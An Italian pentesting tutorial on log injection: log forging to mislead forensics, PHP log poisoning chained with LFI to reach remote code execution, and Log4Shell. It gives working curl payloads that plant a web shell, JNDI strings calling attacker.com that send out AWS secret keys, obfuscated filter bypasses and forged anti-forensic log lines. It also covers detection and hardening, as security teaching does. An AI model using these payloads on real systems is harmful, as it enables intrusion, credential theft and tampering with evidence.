---
title: 'Log Injection: Log Forging, Log Poisoning e RCE tramite LFI'
slug: log-injection
description: >-
  Scopri come sfruttare una Log Injection nel pentesting web: log forging per
  anti-forensic, log poisoning combinato con LFI per ottenere Remote Code
  Execution e il caso storico Log4Shell.
image: /log-injection.webp
draft: false
date: 2026-03-16T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - log
---

I log sono la "memoria" dell'applicazione — registrano chi ha fatto cosa, quando, da dove. Sono lo strumento fondamentale per il debugging, il monitoring e soprattutto per la **forensic** dopo un incidente. E se l'attaccante potesse scrivere quello che vuole nei log? Se potesse iniettare righe di log false che raccontano una storia diversa? Oppure, ancora peggio, se potesse iniettare **codice eseguibile** nei log e poi farlo eseguire al sistema?

La **Log Injection** si verifica quando l'input dell'utente finisce nei file di log senza sanitizzazione. L'impatto va dal **log forging** (righe false per confondere la forensic e il SOC) al **log poisoning** combinato con LFI per ottenere **RCE** — e nel caso storico di **Log4Shell** (CVE-2021-44228), l'iniezione nei log portava direttamente a RCE pre-auth su milioni di server Java nel mondo.

La trovo nel **18% dei pentest** come log injection base (capacità di iniettare contenuto nei log). La combinazione log poisoning + LFI → RCE è più rara (5%) ma devastante. Log4Shell ancora presente nel 3% dei sistemi Java non patchati nel 2026.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [Porta 514 Syslog](https://hackita.it/articoli/porta-514-syslog).

## Cos'è la Log Injection?

La Log Injection è una vulnerabilità in cui l'input dell'utente viene scritto nei file di log dell'applicazione **senza sanitizzazione dei caratteri speciali** (newline, codice eseguibile, espressioni JNDI). L'attaccante può iniettare righe di log false (log forging), codice eseguibile che viene interpretato quando il log viene letto o incluso (log poisoning), o espressioni che il framework di logging valuta come codice (Log4Shell).

> **La Log Injection è pericolosa?**
> Sì — a tre livelli. **Livello 1 (log forging):** confonde la forensic e il SOC, copre le tracce dell'attacco. **Livello 2 (log poisoning + LFI):** inietta codice PHP/Python nel log, poi lo include via [LFI](https://hackita.it/articoli/lfi) → **RCE**. **Livello 3 (Log4Shell):** RCE pre-auth su qualsiasi server Java con Log4j ≤ 2.16.0. Trovata nel **18% dei pentest** come forma base.

## Come Verificare se Sei Vulnerabile

```bash
# Test manuale — inietta newline nel campo username al login
Username: admin\nFAKE_LOG_ENTRY: User admin logged in successfully
# Se il file di log contiene la riga falsa → Log Injection

# Verifica se i log sono leggibili (per log poisoning)
# File comuni:
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/syslog
/var/log/auth.log
/var/www/html/logs/app.log
```

## 1. Log Forging — Confondere la Forensic

Ogni applicazione logga i tentativi di login, le ricerche, le azioni degli utenti. Se il campo username finisce nel log senza escaping:

```python
# ❌ VULNERABILE
logger.info(f"Login attempt: username={username}, ip={request.remote_addr}")
```

L'attaccante inserisce come username:

```
admin\n2026-02-19 10:00:00 INFO - Login successful: username=admin, ip=10.0.0.1, role=administrator
```

Il log mostra:

```
2026-02-19 09:59:58 INFO - Login attempt: username=admin
2026-02-19 10:00:00 INFO - Login successful: username=admin, ip=10.0.0.1, role=administrator
```

La seconda riga è **falsa** — creata dall'attaccante. Un analista del SOC che legge i log vede un login legittimo che non è mai avvenuto. L'attaccante può anche iniettare centinaia di righe di log false per "annegare" le tracce reali dell'attacco.

### Anti-forensic avanzato

```
# Inietta un log di "security scan completed, no issues found"
admin\n2026-02-19 10:00:00 INFO [SECURITY] - Automated security scan completed. Results: 0 vulnerabilities found, 0 anomalies detected.

# Inietta un "server restart" per giustificare un gap nei log
admin\n2026-02-19 10:00:00 WARN [SYSTEM] - Server restarting for scheduled maintenance.
admin\n2026-02-19 10:05:00 INFO [SYSTEM] - Server started successfully. All services nominal.
```

## 2. Log Poisoning → LFI → RCE

Questa è la combinazione letale: inietti **codice eseguibile** nel log, poi usi una vulnerabilità di [Local File Inclusion](https://hackita.it/articoli/lfi) per includere il file di log — e il codice viene eseguito.

### Step 1 — Inietta PHP nel log tramite User-Agent

```bash
curl http://target.com/ -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

Apache scrive l'User-Agent nel access.log:

```
192.168.1.100 - - [19/Feb/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"
```

### Step 2 — Includi il log via LFI

```bash
curl "http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=id"
```

PHP include il file di log → il codice PHP iniettato viene eseguito → **RCE**.

### Varianti del vettore di injection

```bash
# Via header Referer
curl http://target.com/ -H "Referer: <?php system(\$_GET['c']); ?>"

# Via parametro GET (finisce nei log come parte dell'URL)
curl "http://target.com/?q=<?php+system(\$_GET['c']);+?>"

# Via SSH (auth.log)
ssh '<?php system($_GET["c"]); ?>'@target.com
# auth.log: Failed password for <?php system($_GET["c"]); ?> from ...
```

## 3. Log4Shell (CVE-2021-44228) — Il Caso Storico

Apache Log4j2, la libreria di logging più usata in Java, valutava le **espressioni JNDI** (Java Naming and Directory Interface) all'interno dei messaggi di log. Qualsiasi stringa loggata che contenesse `${jndi:ldap://...}` veniva risolta — il server si connetteva all'URL specificato, scaricava e eseguiva una classe Java.

```bash
# L'attaccante inserisce nel campo User-Agent, username, o qualsiasi input loggato:
${jndi:ldap://attacker.com/exploit}

# Il server Log4j:
# 1. Vede ${jndi:ldap://...} nel messaggio di log
# 2. Si connette a attacker.com via LDAP
# 3. Scarica la classe Java exploit
# 4. La esegue → RCE
```

CVSS: **10.0**. Pre-auth, zero-click. Milioni di server vulnerabili (Minecraft, iCloud, Steam, AWS, VMware...).

### Bypass delle patch parziali

```bash
# Bypass con lookup nidificati
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/x}

# Bypass con env lookup
${jndi:ldap://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
# → le credenziali AWS finiscono nella DNS query verso attacker.com

# Bypass unicode
${jndi:ldap://attacker.com/\u0061}
```

### Detection Log4Shell nel 2026

```bash
# Scan con nuclei
nuclei -u https://target.com -tags log4j

# Scan con log4j-scan
python3 log4j-scan.py -u https://target.com --all-params

# Header injection test
curl -H "X-Api-Version: \${jndi:ldap://BURP_COLLAB/test}" https://target.com
curl -H "User-Agent: \${jndi:ldap://BURP_COLLAB/test}" https://target.com
```

## 🏢 Enterprise Escalation

```
Log Injection (forging) → copre le tracce dell'attacco reale
+ Log Poisoning → LFI → RCE → shell
→ doppio vantaggio: exploit + anti-forensic

Log4Shell → RCE pre-auth su server Java
→ Reverse shell → rete interna → AD → Domain Admin
→ o: ${jndi:ldap://attacker/${env:AWS_SECRET_ACCESS_KEY}} → cloud creds via DNS
```

## 🔌 Variante API / Microservizi 2026

```json
// Ogni campo loggato è un vettore
POST /api/v2/auth/login
{"username": "admin\n2026-02-19 INFO Login successful admin from 10.0.0.1", "password": "test"}

// Header custom loggati
GET /api/v2/data
X-Request-ID: test\n2026-02-19 INFO Security scan passed
X-Correlation-ID: ${jndi:ldap://attacker.com/exploit}

// Webhook con payload loggato
POST /api/v2/webhooks/receive
{"event": "payment_completed<?php system('id'); ?>", "amount": 100}
```

## Micro Playbook Reale

**Minuto 0-5 →** Identifica cosa viene loggato (username, User-Agent, parametri)
**Minuto 5-10 →** Inietta newline nel campo loggato: `admin\nFAKE_LOG_LINE`
**Minuto 10-15 →** Se LFI presente: inietta PHP nel log via User-Agent
**Minuto 15-20 →** Includi il log via LFI → RCE
**Minuto 0-3 →** Se Java: testa `${jndi:ldap://COLLABORATOR/}` su ogni input

## Caso Studio Concreto

**Settore:** Piattaforma e-learning, PHP/Apache, 100.000 studenti.
**Scope:** Grey-box.

L'applicazione loggava ogni ricerca dell'utente in un file `search.log`. Ho trovato una LFI nel parametro `template`: `?template=../../../var/www/logs/search.log`. Ho iniettato `<?php system($_GET['c']); ?>` nel campo di ricerca → il codice PHP è finito nel log → LFI include il log → RCE.

```bash
# Step 1: Poisoning
curl "http://target.com/search?q=<?php+system(\$_GET['c']);+?>"

# Step 2: Trigger via LFI
curl "http://target.com/page?template=../../../var/www/logs/search.log&c=id"
# → uid=33(www-data)
```

Dalla shell → database MySQL con 100.000 studenti (nome, email, voti, pagamenti). Nel database: credenziali admin con hash MD5 → craccate in secondi.

**Tempo dalla log injection alla RCE:** 20 minuti.

## Errori Comuni Reali

**1. `logger.info(f"Login: {username}")` — il pattern universale**
Lo sviluppatore logga l'input utente senza escape dei newline.

**2. User-Agent loggato senza escaping**
Apache/Nginx loggano l'User-Agent per default. Se c'è una LFI, il log è un vettore di poisoning automatico.

**3. Log4j non aggiornato**
Nel 2026, il 3% dei server Java ha ancora Log4j ≤ 2.16.0. Spesso in librerie interne o dipendenze transitive.

**4. Log leggibili via LFI o web**
I file di log in directory accessibili via web o includibili via LFI.

**5. Structured logging non adottato**
Il logging in formato testo permette injection di newline. Il logging strutturato (JSON) tratta l'intero input come un singolo campo.

## Indicatori di Compromissione (IoC)

* Righe di log con formato inconsistente (timestamp diverso, hostname sconosciuto)
* Codice PHP/Python/JavaScript nei file di log (`<?php`, `import os`, `<script>`)
* Pattern `${jndi:` nei log o nei parametri delle request (Log4Shell)
* LFI request che puntano a file di log nei log di accesso
* DNS query anomale dal server verso domini sconosciuti (Log4Shell OOB)
* User-Agent insoliti con codice embedded

## Mini Chain Offensiva Reale

```
Log Poisoning (search field) → PHP in search.log → LFI include search.log → RCE www-data → MySQL Creds → 100K Studenti → Admin Hash Crack
```

## Detection & Hardening

* **Escape newline** — rimuovi `\n`, `\r`, `\t` dall'input prima di loggare
* **Structured logging** — usa JSON (es. `structlog`, `winston`, `logback` con JSON encoder) che tratta l'input come valore, non come riga
* **Aggiorna Log4j** — versione ≥ 2.17.0
* **Permessi file log** — i log non devono essere nella document root e non devono essere includibili via LFI
* **WAF** — regole per `${jndi:`, `<?php`, `<script>` nei parametri

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [Porta 514 Syslog](https://hackita.it/articoli/porta-514-syslog), [CRLF Injection](https://hackita.it/articoli/crlf-injection), [LFI](https://hackita.it/articoli/lfi).

> I tuoi log scrivono input utente non sanitizzato? Log4j è aggiornato? [Penetration test HackIta](https://hackita.it/servizi). Per padroneggiare la Log Injection: [formazione 1:1](https://hackita.it/formazione).
